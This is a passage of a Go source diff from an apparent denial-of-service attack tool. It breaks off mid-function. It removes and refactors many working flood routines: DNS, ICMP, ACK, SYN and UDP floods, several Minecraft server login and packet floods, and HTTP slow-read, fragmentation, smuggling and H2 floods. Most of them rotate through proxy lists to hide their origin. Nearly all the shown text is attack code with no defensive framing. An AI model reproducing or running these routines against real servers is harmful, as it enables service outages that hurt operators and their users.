-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", net.JoinHostPort(pURL.Hostname(), "53"), pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("udp", net.JoinHostPort(host, "53"), 5*time.Second)
-        if err != nil {
-            conn, err = net.DialTimeout("tcp", net.JoinHostPort(host, "53"), 5*time.Second)
-            if err != nil {
-                recordStatus("Err")
-                totalErrors.Add(1)
-                return err
-            }
-        }
-    }
-    defer conn.Close()
-
-    dnsQuery := make([]byte, 12+rand.Intn(20))
-    rand.Read(dnsQuery)
-    dnsQuery[4] = 0x00
-    dnsQuery[5] = 0x01
-
-    _, err = conn.Write(dnsQuery)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func icmpFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    ipAddr, err := net.ResolveIPAddr("ip", host)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    conn, err := net.DialIP("ip4:icmp", nil, ipAddr)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    icmpPayload := make([]byte, 64)
-    rand.Read(icmpPayload)
-    icmpPayload[0] = 8
-
-    _, err = conn.Write(icmpPayload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func ackFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    tcpAddr, err := net.ResolveTCPAddr("tcp", "0.0.0.0:0")
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    dstAddr, err := net.ResolveTCPAddr("tcp", addr)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    conn, err := net.DialTCP("tcp", tcpAddr, dstAddr)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 64)
-    rand.Read(payload)
-
-    _, err = conn.Write(payload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func synFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
-    if err != nil {
-        recordStatus("Sent")
-        totalSuccess.Add(1)
-        return nil
-    }
-    conn.Close()
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcExtLogin(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x02)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-    conn.Write(packet)
-
-    username := randString(16)
-    nameLen := len(username)
-    loginStart := []byte{0x00, byte(nameLen)}
-    loginStart = append(loginStart, []byte(username)...)
-
-    reqLen := len(loginStart)
-    reqPacket := []byte{byte(reqLen)}
-    reqPacket = append(reqPacket, loginStart...)
-    conn.Write(reqPacket)
-
-    buf := make([]byte, 4096)
-    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
-    conn.Read(buf)
-
-    time.Sleep(time.Duration(30+rand.Intn(30)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcBungee(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x02)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-    conn.Write(packet)
-
-    bungeeData := fmt.Sprintf("\x00%s\x00%s\x00%d", randString(16), randEmail(), rand.Intn(999999))
-    bungeeLen := len(bungeeData)
-    loginStart := []byte{0x00, byte(bungeeLen)}
-    loginStart = append(loginStart, []byte(bungeeData)...)
-
-    reqLen := len(loginStart)
-    reqPacket := []byte{byte(reqLen)}
-    reqPacket = append(reqPacket, loginStart...)
-    conn.Write(reqPacket)
-
-    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcVarIntFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    junkLen := 20000 + rand.Intn(10000)
-    packetData := make([]byte, junkLen)
-    rand.Read(packetData)
-    packetData[0] = 0x00
-
-    buf := make([]byte, 5)
-    n := 0
-    for {
-        b := byte(junkLen >> (uint(n) * 7) & 0x7F)
-        if junkLen >>(uint(n)*7+7) == 0 {
-            buf[n] = b
-            n++
-            break
-        }
-        buf[n] = b | 0x80
-        n++
-    }
-
-    finalPacket := append(buf[:n], packetData...)
-    conn.Write(finalPacket)
-
-    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcPingVariation(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    randomHost := randString(rand.Intn(100)+10) + "." + host
-    hostLen := len(randomHost)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(randomHost)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x01)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-
-    _, err = conn.Write(packet)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    time.Sleep(time.Duration(15+rand.Intn(15)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcDataSpam(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x02)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-    conn.Write(packet)
-
-    username := randString(16)
-    nameLen := len(username)
-    loginStart := []byte{0x00, byte(nameLen)}
-    loginStart = append(loginStart, []byte(username)...)
-    reqLen := len(loginStart)
-    reqPacket := []byte{byte(reqLen)}
-    reqPacket = append(reqPacket, loginStart...)
-    conn.Write(reqPacket)
-
-    buf := make([]byte, 4096)
-    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
-    conn.Read(buf)
-
-    for i := 0; i < 100; i++ {
-        spamData := make([]byte, 64)
-        rand.Read(spamData)
-        spamData[0] = 0x10
-        spamLen := len(spamData)
-
-        lBuf := make([]byte, 5)
-        n := 0
-        for {
-            b := byte(spamLen >> (uint(n) * 7) & 0x7F)
-            if spamLen >>(uint(n)*7+7) == 0 {
-                lBuf[n] = b
-                n++
-                break
-            }
-            lBuf[n] = b | 0x80
-            n++
-        }
-
-        finalPacket := append(lBuf[:n], spamData...)
-        _, err = conn.Write(finalPacket)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-
-    time.Sleep(time.Duration(30+rand.Intn(30)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcProfileFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x02)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-    conn.Write(packet)
-
-    for i := 0; i < 50; i++ {
-        username := randString(16)
-        nameLen := len(username)
-        loginStart := []byte{0x00, byte(nameLen)}
-        loginStart = append(loginStart, []byte(username)...)
-
-        reqLen := len(loginStart)
-        reqPacket := []byte{byte(reqLen)}
-        reqPacket = append(reqPacket, loginStart...)
-        conn.Write(reqPacket)
-
-        time.Sleep(100 * time.Millisecond)
-    }
-
-    time.Sleep(time.Duration(15+rand.Intn(15)) * time.Second)
     recordStatus("Sent")
     totalSuccess.Add(1)
     return nil
@@ -3636,38 +2019,16 @@ func httpInvalidReqLine(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -3725,38 +2086,16 @@ func httpGhostFlood(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -3814,38 +2153,16 @@ func httpFragFlood(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -3879,7 +2196,7 @@ func httpFragFlood(targetURL string, stop <-chan struct{}) error {
             totalErrors.Add(1)
             return err
         }
-        time.Sleep(time.Duration(100+rand.Intn(400)) * time.Millisecond)
+        time.Sleep(time.Duration(100+rand.IntN(400)) * time.Millisecond)
         if i%10 == 0 {
             recordStatus("Sent")
             totalSuccess.Add(1)
@@ -3973,7 +2290,9 @@ func httpSlowRead(targetURL string, client *http.Client, stop <-chan struct{}) e
     defer resp.Body.Close()
     recordStatus(strconv.Itoa(resp.StatusCode))
 
-    buf := make([]byte, 1)
+    buf := bufPool.Get().([]byte)
+    defer bufPool.Put(buf)
+
     for {
         select {
         case <-stop:
@@ -3984,7 +2303,7 @@ func httpSlowRead(targetURL string, client *http.Client, stop <-chan struct{}) e
         if err != nil {
             return nil
         }
-        time.Sleep(time.Duration(1+rand.Intn(5)) * time.Second)
+        time.Sleep(time.Duration(1+rand.IntN(5)) * time.Second)
         recordStatus("Held")
         totalSuccess.Add(1)
     }
@@ -4010,38 +2329,16 @@ func httpInvalidHeader(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -4099,7 +2396,7 @@ func httpRapidConnect(targetURL string, stop <-chan struct{}) error {
 
     var conn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
@@ -4170,38 +2467,16 @@ func httpH2Flood(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -4328,47 +2603,6 @@ func httpH2Flood(targetURL string, stop <-chan struct{}) error {
     }
 }
 
-func udpAmpFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    conn, err := net.Dial("udp", addr)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 4096)
-    rand.Read(payload)
-    for {
-        select {
-        case <-stop:
-            return nil
-        default:
-        }
-        _, err := conn.Write(payload)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        recordStatus("Sent")
-        totalSuccess.Add(1)
-    }
-}
-
 func httpJsonFlood(targetURL string, client *http.Client) error {
     body := fmt.Sprintf(`{"user":"%s","pass":"%s","token":"%s","data":[%s]}`,
         randString(20), randString(20), randString(32), randString(1000))
@@ -4449,45 +2683,16 @@ func httpConnectionSmuggle(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
-        if pURL.User != nil {
-            user := pURL.User.Username()
-            pass, _ := pURL.User.Password()
-            cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
-            connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
-        }
-        connectReq += "Connection: keep-alive\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -4547,38 +2752,16 @@ func httpLongHeader(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -4673,7 +2856,7 @@ func httpDeadConn(targetURL string, client *http.Client, stop <-chan struct{}) e
     defer resp.Body.Close()
     recordStatus(strconv.Itoa(resp.StatusCode))
 
-    time.Sleep(time.Duration(60+rand.Intn(60)) * time.Second)
+    time.Sleep(time.Duration(60+rand.IntN(60)) * time.Second)
     return nil
 }
 
@@ -4697,38 +2880,16 @@ func httpBadStart(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -4762,7 +2923,7 @@ func httpBadStart(targetURL string, stop <-chan struct{}) error {
         return err
     }
 
-    ticker := time.NewTicker(1 + time.Duration(rand.Intn(4))*time.Second)
+    ticker := time.NewTicker(1 + time.Duration(rand.IntN(4))*time.Second)
     defer ticker.Stop()
 
     for {
@@ -4784,7 +2945,7 @@ func httpBadStart(targetURL string, stop <-chan struct{}) error {
 
 func httpFormBomb(targetURL string, client *http.Client) error {
     var sb strings.Builder
-    n := 1000 + rand.Intn(5000)
+    n := 1000 + rand.IntN(5000)
     for i := 0; i < n; i++ {
         if i > 0 {
             sb.WriteByte('&')
@@ -4842,784 +3003,6 @@ func httpNTLMFlood(targetURL string, client *http.Client) error {
     return nil
 }
 
-func mcAccountFill(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x02)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-    conn.Write(packet)
-
-    username := randString(16)
-    nameLen := len(username)
-    loginStart := []byte{0x00, byte(nameLen)}
